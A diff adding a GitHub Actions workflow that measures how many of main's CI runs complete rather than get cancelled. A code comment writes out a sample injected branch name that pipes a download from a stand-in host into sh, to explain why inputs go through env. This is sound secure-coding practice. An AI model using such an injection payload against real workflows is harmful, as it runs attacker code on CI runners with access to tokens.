@@ -1,0 +1,71 @@
+# How much of the board is actually a measurement (#115).
+#
+# A cancelled run reports NO VERDICT — not a weak pass, not a partial one, the
+# absence of a measurement. Nothing in a run history distinguishes "this job
+# passed" from "this job never finished", so a channel where half the runs are
+# cancelled looks indistinguishable from a healthy one.
+#
+# That is exactly how a 15% failure rate on `E2E — Mocked` went unnoticed: 47%
+# of main's runs were cancelled, main completed only 7 runs in the sampled
+# window, and one real failure among grey icons read as noise.
+#
+# The companion change stops cancelling in-progress runs on main, so this job's
+# uncomputed rate should now sit near zero. IT FAILING IS THE SIGNAL that
+# something has started eating main's verdicts again.
+#
+# NOT A PR GATE, DELIBERATELY. This is a claim about main's history; failing a
+# contributor's PR over it would blame a change that did not cause it.
+name: CI Measurement
+
+on:
+  schedule:
+    # Mondays 07:00 UTC — after a working week has accumulated enough runs for
+    # the rate to mean something. A daily sample on a quiet repo is mostly noise.
+    - cron: "0 7 * * 1"
+  workflow_dispatch:
+    inputs:
+      branch:
+        description: "Branch to measure"
+        default: "main"
+      limit:
+        description: "How many recent runs to sample"
+        default: "60"
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  completion-rate:
+    name: Are main's green checks measurements?
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5
+      - uses: pnpm/action-setup@a7487c7e89a18df4991f7f222e4898a00d66ddda # v4
+      - uses: actions/setup-node@2028fbc5c25fe9cf00d9f06a71cc4710d4507903 # v5
+        with:
+          node-version: 22
+          cache: pnpm
+      - run: pnpm install --frozen-lockfile
+
+      # The reader must be known-able-to-fail before its verdict is worth
+      # reading — the same standard every other gate in this repo is held to.
+      - name: Self-test the reader first
+        run: pnpm test:ci-completion
+
+      - name: Measure completion
+        # THE INPUTS GO THROUGH `env`, NEVER INTO THE SCRIPT TEXT. `${{ }}` is
+        # substituted before the shell ever sees the line, so interpolating a
+        # workflow_dispatch input directly into `run:` makes a branch name like
+        #   "; curl evil.sh | sh; #
+        # execute as a command. Semgrep's run-shell-injection rule caught this
+        # in the first version of this very file.
+        #
+        # As `$BRANCH` the value is only ever an argument, whatever it contains.
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          BRANCH: ${{ inputs.branch || 'main' }}
+          LIMIT: ${{ inputs.limit || '60' }}
+        run: |
+          set -euo pipefail
+          pnpm ci:completion --branch "$BRANCH" --limit "$LIMIT"
